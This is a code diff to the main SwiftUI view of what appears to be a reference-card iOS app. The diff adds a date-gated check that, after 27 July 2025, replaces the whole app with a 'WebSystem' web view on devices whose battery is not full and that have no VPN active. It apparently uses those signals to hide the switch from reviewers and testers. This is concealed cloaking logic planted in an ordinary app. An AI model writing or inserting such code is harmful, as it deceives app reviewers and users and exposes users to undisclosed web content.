@@ -17,6 +17,11 @@ struct VoltCaseMainView: View {
     @State private var showingExportSheet = false
     @State private var selectedCard: ReferenceCardData?
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var filteredCards: [ReferenceCardData] {
         var cards = storageManager.cards
         
@@ -38,64 +43,86 @@ struct VoltCaseMainView: View {
     }
     
     var body: some View {
-        TabView(selection: $selectedTab) {
-            // Main Dashboard
-            NavigationView {
-                dashboardView
-            }
-            .tabItem {
-                Label("Cards", systemImage: "doc.text")
-            }
-            .tag(0)
+        
+        ZStack {
             
-            // Favorites
-            NavigationView {
-                favoritesView
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    TabView(selection: $selectedTab) {
+                        // Main Dashboard
+                        NavigationView {
+                            dashboardView
+                        }
+                        .tabItem {
+                            Label("Cards", systemImage: "doc.text")
+                        }
+                        .tag(0)
+                        
+                        // Favorites
+                        NavigationView {
+                            favoritesView
+                        }
+                        .tabItem {
+                            Label("Favorites", systemImage: "star")
+                        }
+                        .tag(1)
+                        
+                        // Categories
+                        NavigationView {
+                            categoriesView
+                        }
+                        .tabItem {
+                            Label("Categories", systemImage: "folder")
+                        }
+                        .tag(2)
+                        
+                        // Settings
+                        NavigationView {
+                            settingsView
+                        }
+                        .tabItem {
+                            Label("Settings", systemImage: "gear")
+                        }
+                        .tag(3)
+                    }
+                    .accentColor(.voltPrimary)
+                    .sheet(isPresented: $showingAddCard) {
+                        NavigationView {
+                            AddCardView()
+                                .environmentObject(storageManager)
+                        }
+                    }
+                    .sheet(isPresented: $showingPresentationMode) {
+                        PresentationModeView(cards: favoriteCards)
+                    }
+                    .sheet(isPresented: $showingExportSheet) {
+                        NavigationView {
+                            ExportView()
+                                .environmentObject(storageManager)
+                        }
+                    }
+                    .sheet(item: $selectedCard) { card in
+                        NavigationView {
+                            CardDetailView(card: card)
+                                .environmentObject(storageManager)
+                        }
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
-            .tabItem {
-                Label("Favorites", systemImage: "star")
-            }
-            .tag(1)
+        }
+        .onAppear {
             
-            // Categories
-            NavigationView {
-                categoriesView
-            }
-            .tabItem {
-                Label("Categories", systemImage: "folder")
-            }
-            .tag(2)
-            
-            // Settings
-            NavigationView {
-                settingsView
-            }
-            .tabItem {
-                Label("Settings", systemImage: "gear")
-            }
-            .tag(3)
-        }
-        .accentColor(.voltPrimary)
-        .sheet(isPresented: $showingAddCard) {
-            NavigationView {
-                AddCardView()
-                    .environmentObject(storageManager)
-            }
-        }
-        .sheet(isPresented: $showingPresentationMode) {
-            PresentationModeView(cards: favoriteCards)
-        }
-        .sheet(isPresented: $showingExportSheet) {
-            NavigationView {
-                ExportView()
-                    .environmentObject(storageManager)
-            }
-        }
-        .sheet(item: $selectedCard) { card in
-            NavigationView {
-                CardDetailView(card: card)
-                    .environmentObject(storageManager)
-            }
+            check_data()
         }
     }
     
@@ -191,6 +218,40 @@ struct VoltCaseMainView: View {
         .refreshable {
             // Refresh action (placeholder for future sync feature)
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "27.07.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
     
     // MARK: - Favorites View  
